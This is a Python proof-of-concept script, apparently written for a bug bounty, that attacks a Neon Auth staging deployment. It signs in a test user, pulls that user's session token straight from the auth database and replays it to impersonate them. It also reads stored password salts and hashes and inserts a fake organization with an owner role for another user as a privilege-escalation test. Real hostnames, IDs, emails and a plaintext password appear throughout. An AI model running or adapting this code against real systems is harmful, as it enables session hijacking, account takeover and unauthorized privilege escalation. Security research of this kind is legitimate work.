# -*- coding: utf-8 -*-
"""V28b: fresh U2 sign-in -> steal session from DB -> API impersonate proof"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
ctx = ssl.create_default_context()
PASS = "SecTest!2026pass"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin="http://localhost:3000", timeout=25):
    conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
    hdrs = {"Content-Type": "application/json", "Origin": origin,
            "User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    if cookie:
        hdrs["Cookie"] = cookie
    conn.request(method, path, json.dumps(body).encode() if body is not None else None, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    ck = resp.getheader("Set-Cookie", "")
    conn.close()
    time.sleep(0.25)
    return resp.status, data, ck


def main():
    import psycopg
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    out("== V28b fresh-session steal ==")
    # fresh U2 sign-in
    st, d, ck = na("POST", "/neondb/auth/sign-in/email",
                   {"email": "libobo1229+na_org2@gmail.com", "password": PASS})
    resp_token = None
    try:
        resp_token = json.loads(d).get("token")
    except Exception:
        pass
    out("sign-in %s token=%s" % (st, bool(resp_token)))
    # DB read newest U2 session
    conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
    conn.request("GET", "/api/v2/projects/orange-sun-90493739/connection_uri"
                 "?database_name=neondb&role_name=neondb_owner"
                 "&branch_id=br-wandering-field-w2ob6mpn",
                 headers={"X-Bug-Bounty": "xxbo",
                          "Authorization": "Bearer " + json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]})
    r = conn.getresponse()
    uri = json.loads(r.read().decode())["uri"]
    conn.close()
    p = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
    uri2 = urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute('SELECT token FROM neon_auth.session WHERE "userId"=\'66b42c6b-c41e-4c5a-a2fa-aa5957cfaec0\' '
                        'ORDER BY "createdAt" DESC LIMIT 1')
            tok = cur.fetchone()[0]
    out("DB token match signin token: %s" % (tok == resp_token))
    # impersonate via stolen token
    st, d, _ = na("GET", "/neondb/auth/get-session",
                  cookie="__Secure-neon-auth.session_token=" + tok)
    out("stolen get-session -> %s %s" % (st, d[:200]))
    st, d, _ = na("GET", "/neondb/auth/organization/list",
                  cookie="__Secure-neon-auth.session_token=" + tok)
    out("stolen org/list    -> %s %s" % (st, d[:150]))
    # write test: DB-set active org / role escalation via direct member INSERT (owner)
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute("SELECT email, password FROM neon_auth.account LIMIT 1")
            for email, pw in cur.fetchall():
                s = str(pw).split(":", 1)
                out("account sample: %s salt=%d hash=%d" % (email, len(s[0]), len(s[1])))
    # owner DB-write: insert fake org + owner membership for U1 -> API visible?
    import uuid
    fake_org = str(uuid.uuid4())
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute("INSERT INTO neon_auth.organization (id, name, slug, logo, metadata, \"createdAt\", \"updatedAt\") "
                        "VALUES (%s, 'v28-db-org', 'v28db%d', NULL, NULL, now(), now())" % ("'" + fake_org + "'", int(time.time())))
            cur.execute("INSERT INTO neon_auth.member (id, \"organizationId\", \"userId\", role, \"createdAt\") "
                        "VALUES (%s, %s, %s, 'owner', now())" % ("'" + str(uuid.uuid4()) + "'", "'" + fake_org + "'", "'f2366454-d3f4-4a80-ba3b-e5ca93c25f82'"))
    out("DB org created: %s" % fake_org)
    # API: U1 sees the DB-created org?
    st, d, ck1 = na("POST", "/neondb/auth/sign-in/email",
                    {"email": "libobo1229+na_org1@gmail.com", "password": PASS})
    c1 = ck1.split(";")[0]
    st, d, _ = na("GET", "/neondb/auth/organization/list", cookie=c1)
    out("U1 org/list after DB insert -> %s %s" % (st, d[:250]))
    # org API actions on DB-created org (invite as owner)
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": fake_org, "email": "libobo1229+na_org3@gmail.com", "role": "member"}, c1)
    out("invite via DB-created org -> %s %s" % (st, d[:120]))
    # cleanup
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute("DELETE FROM neon_auth.member WHERE \"organizationId\"=%s", (fake_org,))
            cur.execute("DELETE FROM neon_auth.organization WHERE id=%s", (fake_org,))
    out("cleaned")
    out("done")


if __name__ == "__main__":
    main()
